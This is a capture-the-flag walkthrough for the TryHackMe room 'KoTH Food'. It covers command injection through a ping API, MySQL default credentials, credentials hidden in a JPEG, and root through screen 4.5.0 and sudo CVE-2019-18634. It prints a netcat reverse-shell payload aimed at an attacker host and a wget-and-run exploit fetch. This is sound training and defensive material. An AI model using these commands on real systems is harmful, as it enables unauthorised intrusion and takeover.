---
title: "KoTH Food CTF"
description: "A King of the Hill practice CTF machine on TryHackMe featuring command injection via a custom API, MySQL default credentials, steganography in a JPEG image, and privilege escalation through a vulnerable SUID screen binary and a sudo CVE."
difficulty: "Easy"
tags: ["Command Injection", "MySQL", "Steganography", "SUID", "Screen", "CVE-2019-18634", "Privilege Escalation"]
date: "2026-07-04"
---

![KoTH Food CTF cover](/assets/screenshots/food/1.png)

## Overview

KoTH Food CTF is a TryHackMe room designed to practice King of the Hill (KoTH) mechanics in a standalone environment. The machine exposes multiple services including a custom web application with a command injection vulnerability, a MySQL server with default credentials, and a hidden image with embedded credentials via steganography. Multiple privilege escalation paths exist — a SUID `screen-4.5.0` binary with a known local root exploit, and a sudo configuration vulnerable to CVE-2019-18634.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** Web command injection, MySQL enumeration, JPEG steganography, SUID exploitation, sudo CVE-2019-18634

## Enumeration

### Nmap Scan

Started with a comprehensive port scan:

```bash
nmap -p- -sV -sC -oN nmap.txt <target-ip>
```

Five open ports were discovered:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 |
| 3306/tcp | MySQL | MySQL 5.7.29 |
| 9999/tcp | HTTP | Golang net/http server |
| 15065/tcp | HTTP | Unknown |
| 16109/tcp | HTTP | Unknown |

![Nmap scan results](/assets/screenshots/food/2.png)

Port 9999 returned "king" when queried — a KoTH mechanic. Ports 15065 and 16109 were both serving HTTP content and warranted closer inspection.

### Web Service on Port 15065

Visiting the service on port 15065 showed a simple page indicating the site was under maintenance:

![Port 15065 web page](/assets/screenshots/food/3.png)

Directory brute-forcing with dirsearch revealed a hidden endpoint:

```bash
dirsearch -u http://<target-ip>:15065/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301
```

The `/monitor` directory was discovered.

![Monitor page — Ping Host UI](/assets/screenshots/food/monitor_page.png)

The `/monitor` page presented a polished GUI with a "Ping Host" feature that accepted an IP address. This type of functionality is often vulnerable to command injection.

Attempting to inject commands directly in the text box failed — the frontend validated the input as a proper IP address:

![Command injection attempt blocked](/assets/screenshots/food/cmd_injection_attempt.png)

### API Discovery

Using browser developer tools, a POST request to `/api/cmd` was observed when submitting a valid IP address. The request body contained `ping -c 4 127.0.0.1`. The command was being constructed client-side, meaning the API endpoint would accept arbitrary commands if we bypassed the frontend validation entirely.

## Initial Access — Command Injection

By sending a direct POST request with `curl`, arbitrary commands could be executed on the server:

```bash
curl <target-ip>:15065/api/cmd -X POST -d "ls -lah"
```

The response returned the directory listing, confirming blind command injection:

![Command injection via curl](/assets/screenshots/food/curl_cmd_injection.png)

### Reverse Shell

Started a netcat listener and sent a reverse shell payload:

```bash
nc -lvnp 4444
```

```bash
curl <target-ip>:15065/api/cmd -X POST -d "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker-ip> 4444 >/tmp/f"
```

The shell connected back immediately:

![Reverse shell obtained](/assets/screenshots/food/rev_shell.png)

## MySQL Enumeration

With a foothold on the machine, attention turned to the MySQL service on port 3306. Default credentials were attempted:

```bash
mysql -h 127.0.0.1 -u root -p
# (no password / root:root)
```

![MySQL login with default credentials](/assets/screenshots/food/mysql_login.png)

Access was granted. Enumerated the databases and found a `users` database with a `User` table:

```sql
show databases;
use users;
show tables;
select * from User;
```

The query returned credentials for user `ramen` and a flag:

![MySQL enumeration showing ramen credentials](/assets/screenshots/food/10.png)

### SSH as ramen

Used the discovered credentials to SSH into the machine:

```bash
ssh ramen@<target-ip>
```

![SSH login as ramen](/assets/screenshots/food/ssh_ramen.png)

The ramen user had limited privileges. Notably, entering the sudo password showed asterisks (`****`), indicating the `pwfeedback` option was enabled in sudoers — a clue for later privilege escalation.

## Port 16109 — Steganography

### Downloading the Image

Port 16109 was serving binary data. Used curl to download it:

```bash
curl <target-ip>:16109 --output food.jpg
file food.jpg
```

It was a JPEG image — a picture of food.

![Downloading image from port 16109](/assets/screenshots/food/curl_port16109.png)

### Extracting Hidden Data

Ran `binwalk` on the image to check for embedded data:

```bash
binwalk -e food.jpg
```

![Binwalk extraction](/assets/screenshots/food/5.png)

Binwalk extracted files from the image. Reading the extracted content revealed credentials for the `pasta` user:

```bash
cat extracted-data/*
```

![Pasta credentials found](/assets/screenshots/food/5.png)

The steganography approach using `steghide` also works without a passphrase since the image had no password set:

```bash
steghide extract -sf food.jpg
```

### SSH as pasta

Logged in as the pasta user:

```bash
ssh pasta@<target-ip>
```

![SSH login as pasta](/assets/screenshots/food/ssh_pasta.png)

## Privilege Escalation

### SUID Binary Discovery

Searched for SUID binaries on the system:

```bash
find / -perm -04000 -type f 2>/dev/null
```

![SUID binary search results](/assets/screenshots/food/suid_find.png)

Several unusual SUID binaries stood out:

- `/usr/bin/screen-4.5.0` — manually installed, not from apt
- `/usr/bin/vim.basic` — can be used for privilege escalation via GTFOBins

### Screen 4.5.0 Local Root Exploit (CVE-2017-17097)

Screen version 4.5.0 has a well-known local privilege escalation vulnerability. The exploit (EDB-ID 41154), commonly called `screenroot.sh`, uses a race condition to create a SUID root shell.

Downloaded the exploit script to the target machine:

```bash
# On target
wget http://<attacker-ip>:8000/41154.sh
chmod +x 41154.sh
./41154.sh
```

![Screen exploit execution](/assets/screenshots/food/screen_exploit.png)

The exploit created a SUID root shell:

![Root shell obtained](/assets/screenshots/food/root_shell.png)

### Alternative Path — CVE-2019-18634 (sudo pwfeedback)

The asterisk feedback when entering sudo passwords indicated `pwfeedback` was enabled in `/etc/sudoers`. This setting is vulnerable to CVE-2019-18634, a buffer overflow that can be triggered to escalate privileges to root without authentication.

The exploit was available on GitHub:

```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
gcc exploit.c -o exploit
./exploit
```

### Root Access

Once root, collected all flags from standard KoTH locations — typically stored in various directories across the filesystem.

## Flags

KoTH flags are scattered across the system in various locations. Common locations include `/root`, `/home/*`, `/var/www`, and other system directories:

![KoTH flag 1](/assets/screenshots/food/7.png)
![KoTH flag 2](/assets/screenshots/food/8.png)
![KoTH flag 3](/assets/screenshots/food/9.png)
![KoTH flag 4](/assets/screenshots/food/14.png)
![KoTH flag 5](/assets/screenshots/food/15.png)

## Commands Used

```bash
nmap -p- -sV -sC -oN nmap.txt <target-ip>
dirsearch -u http://<target-ip>:15065/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301
curl <target-ip>:15065/api/cmd -X POST -d "ls -lah"
curl <target-ip>:15065/api/cmd -X POST -d "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker-ip> 4444 >/tmp/f"
mysql -h 127.0.0.1 -u root -p
show databases; use users; show tables; select * from User;
curl <target-ip>:16109 --output food.jpg
binwalk -e food.jpg
steghide extract -sf food.jpg
find / -perm -04000 -type f 2>/dev/null
# screenroot.sh exploit
./41154.sh
# OR CVE-2019-18634
./exploit
```

## Lessons Learned

- **Client-side validation is not security.** The web application validated IP addresses in the browser but the backend API accepted any command. Always validate inputs server-side.
- **Default credentials remain a problem.** MySQL with `root:root` is still common in CTF machines and real-world misconfigurations. Always change default passwords.
- **Images can hide more than pixels.** Steganography tools like `steghide` and `binwalk` can extract embedded data from image files. Steganography without a passphrase is trivially reversible.
- **SUID binaries outside the package manager are suspicious.** The manually installed `screen-4.5.0` was a clear indicator of a deliberate privilege escalation vector.
- **Sudo pwfeedback (CVE-2019-18634)** is a lesser-known but effective vulnerability. The `pwfeedback` option in sudoers, which shows asterisks when typing a password, introduces a stack-based buffer overflow that can lead to root.
- **KoTH vs standard CTF:** King of the Hill machines often have multiple flags scattered across the system, multiple users with different credentials, and sometimes multiple exploitation paths. The goal is to "claim" the machine by holding the `/root/king.txt` file and defending it against other players.

## References

- [TryHackMe — KoTH Food CTF](https://tryhackme.com/room/kothfoodctf)
- [Screen 4.5.0 Exploit (EDB 41154)](https://www.exploit-db.com/exploits/41154)
- [CVE-2019-18634 — Sudo pwfeedback](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)
- [GTFOBins — Vim](https://gtfobins.github.io/gtfobins/vim/)
